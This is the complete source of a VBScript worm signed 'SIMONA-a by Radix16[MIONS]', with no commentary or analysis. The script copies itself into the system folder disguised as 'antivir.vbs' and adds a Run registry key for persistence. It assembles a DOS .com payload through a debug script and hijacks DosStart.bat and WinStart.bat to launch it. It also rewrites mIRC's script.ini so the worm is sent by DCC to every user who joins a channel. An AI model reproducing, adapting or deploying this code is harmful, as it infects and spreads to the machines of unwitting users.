' SIMONA-a by Radix16[MIONS]

On Error Resume Next
dim Simona,b,e,fso,dwin,a,dwinsys
Set Simona = CreateObject("Scripting.FileSystemObject")
Set dwin = Simona.GetSpecialFolder(0)
Set dwinsys = Simona.GetSpecialFolder(1)
Set asddsa = Simona.GetFile(WScript.ScriptFullName)
asddsa.copy (dwinsys&"\antivir.vbs")
RegW()
DosDropp()
If Not (Simona.Fileexists(dwin&"\oldDos.bat")) Then
DosStart()
End if
IRC()
WinStart()
Sub DosDropp ()
On Error Resume Next
dim c,d
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.CreateTextFile(dwin&"\COMMAND\dropper.bat", True)
d.WriteLine "@ debug < dropper.scr"
d.WriteLine "@ cls"
d.WriteLine "@ cd \"
d.close
Set fso = CreateObject("Scripting.FileSystemObject")
Set c = fso.CreateTextFile(dwin&"\COMMAND\dropper.scr", True)
c.WriteLine "N dropper.com"
c.WriteLine ""
c.WriteLine "E 0100 E8 00 00 5D 81 ED 03 01 B8 21 35 CD 21 89 1E 6F"
c.WriteLine "E 0110 01 8C 06 71 01 B8 21 25 BA 22 01 CD 21 BA 8E 01"
c.WriteLine "E 0120 CD 27 3D 00 4B 75 47 50 53 51 52 55 56 57 1E 06"
c.WriteLine "E 0130 B9 F4 01 B0 53 E8 28 00 B0 69 E8 23 00 B0 6D E8"
c.WriteLine "E 0140 1E 00 B0 6F E8 19 00 B0 6E E8 14 00 B0 61 E8 0F"
c.WriteLine "E 0150 00 B0 03 E8 0A 00 B0 03 E8 05 00 E2 D6 EB 06 90"
c.WriteLine "E 0160 B4 0E CD 10 C3 07 1F 5F 5E 5D 5A 59 5B 58 EA 00"
c.WriteLine "E 0170 00 00 00 53 49 4D 4F 4E 41 03 03 18 62 79 20 52"
c.WriteLine "E 0180 61 64 69 78 31 36 5B 4D 49 4F 4E 53 5D"
c.WriteLine "RCX"
c.WriteLine "8D"
c.WriteLine "W"
c.WriteLine "Q"
c.close
End Sub
Sub DosStart ()
On Error Resume Next
Set File1 = Simona.GetFile(dwin&"\DosStart.bat")
File1.copy (dwin&"\oldDos.bat")
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.CreateTextFile(dwin&"\DosStart.bat", True)
a.WriteLine "@ Cd "&dwin&"\COMMAND"
a.WriteLine "@ dropper.com"
a.WriteLine "@ cls"
a.WriteLine "@ Cd.."
a.WriteLine "@ oldDos.bat"
a.close
End Sub
Sub WinStart ()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set b = fso.CreateTextFile(dwin&"\WinStart.bat", True)
b.WriteLine "@ Cd "&dwin&"\COMMAND"
b.WriteLine "@ cls"
b.WriteLine "@ Dropper.bat"
b.close
End sub
Sub IRC ()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set e = fso.CreateTextFile("c:\mirc\script.ini", True)
e.WriteLine "[script]"
e.WriteLine "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
e.WriteLine "n1=/dcc send $nick "&dwinsys&"\antivir.vbs"
e.WriteLine "}"
e.close
End sub
Sub RegW ()
Set Regedit = CreateObject("WScript.Shell")
Regedit.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\antivbs",dwinsys&"\antivir.vbs"
End sub



